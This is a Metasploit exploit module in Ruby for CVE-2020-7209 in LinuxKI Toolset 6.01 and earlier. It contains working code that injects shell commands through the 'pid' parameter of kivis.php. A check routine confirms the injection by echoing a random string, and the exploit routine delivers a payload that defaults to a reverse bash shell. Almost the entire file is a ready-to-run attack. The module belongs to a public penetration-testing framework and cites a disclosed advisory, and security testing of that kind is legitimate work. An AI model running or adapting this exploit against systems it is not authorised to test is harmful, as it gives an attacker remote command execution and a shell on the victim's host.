##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LinuxKI Toolset 6.01 Remote Command Execution',
        'Description' => %q{
          This module exploits a vulnerability in LinuxKI Toolset <= 6.01 which allows remote code execution.
          The kivis.php pid parameter received from the user is sent to the shell_exec function, resulting in security vulnerability.
        },
        'License' => MSF_LICENSE,
        'Author' =>
            [
              'Cody Winkler', # discovery and poc
              'numan turle' # msf exploit
            ],
        'References' =>
            [
              ['EDB', '48483'],
              ['CVE', '2020-7209'],
              ['PACKETSTORM', '157739'],
              ['URL', 'https://github.com/HewlettPackard/LinuxKI/commit/10bef483d92a85a13a59ca65a288818e92f80d78']
            ],
        'Privileged' => false,
        'Payload' =>
            {
              'DisableNops' => true,
              'Compat' =>
                    {
                      'PayloadType' => 'cmd'
                    }
            },
        'Platform' => %w[linux unix],
        'Arch' => ARCH_CMD,
        'DefaultOptions' =>
            {
              'payload' => 'cmd/unix/reverse_bash'
            },
        'Targets' => [['LinuxKI 6.01', {}],],
        'DisclosureDate' => 'May 17 2020',
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The path to the web application', '/']),
    ])
  end

  def check
    begin
      findstr = Rex::Text.rand_text_alphanumeric(10..15)
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'linuxki/experimental/vis/', 'kivis.php'),
        'vars_get' => {
          'type' => 'kitrace',
          'pid' => "1;echo '#{findstr}';"
        }
      })

      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if (res.code == 404) || (res.code == 403)

      if res && (res.code == 200) && res.body.include?(findstr)
        return CheckCode::Vulnerable
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    CheckCode::Safe
  end

  def http_send_command(cmd)
    begin
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'linuxki/experimental/vis/', 'kivis.php'),
        'vars_get' => {
          'type' => 'kitrace',
          'pid' => '1;' + cmd + ';'
        }
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end

  def exploit
    print_status('Sending exploit...')
    http_send_command(payload.encoded)
  end

end
